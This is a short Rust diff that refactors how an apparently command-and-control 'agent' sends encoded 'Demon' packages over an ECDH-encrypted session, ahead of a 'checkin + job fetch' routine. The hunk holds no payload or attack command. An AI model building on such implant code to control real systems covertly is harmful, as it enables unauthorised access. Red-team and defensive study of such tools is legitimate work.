@@ -590,15 +590,20 @@ impl SpecterAgent {
         &mut self,
         packages: Vec<DemonPackage>,
     ) -> Result<Vec<u8>, SpecterError> {
-        let session = self
+        let (connection_id, session_key) = self
             .ecdh_session
             .as_ref()
-            .ok_or(SpecterError::Transport("ECDH session not initialized".into()))?
-            .clone();
+            .ok_or_else(|| SpecterError::Transport("ECDH session not initialized".into()))
+            .map(|s| (s.connection_id, s.session_key))?;
         let payload = DemonMessage::new(packages)
             .to_bytes()
             .map_err(|e| SpecterError::Transport(format!("ECDH message encode: {e}")))?;
-        send_session_packet(self.transport.primary(), &session, &payload).await
+        send_session_packet(
+            self.transport.primary(),
+            &EcdhSession { connection_id, session_key, agent_id: 0 },
+            &payload,
+        )
+        .await
     }
 
     /// ECDH-mode checkin + job fetch in one session packet.
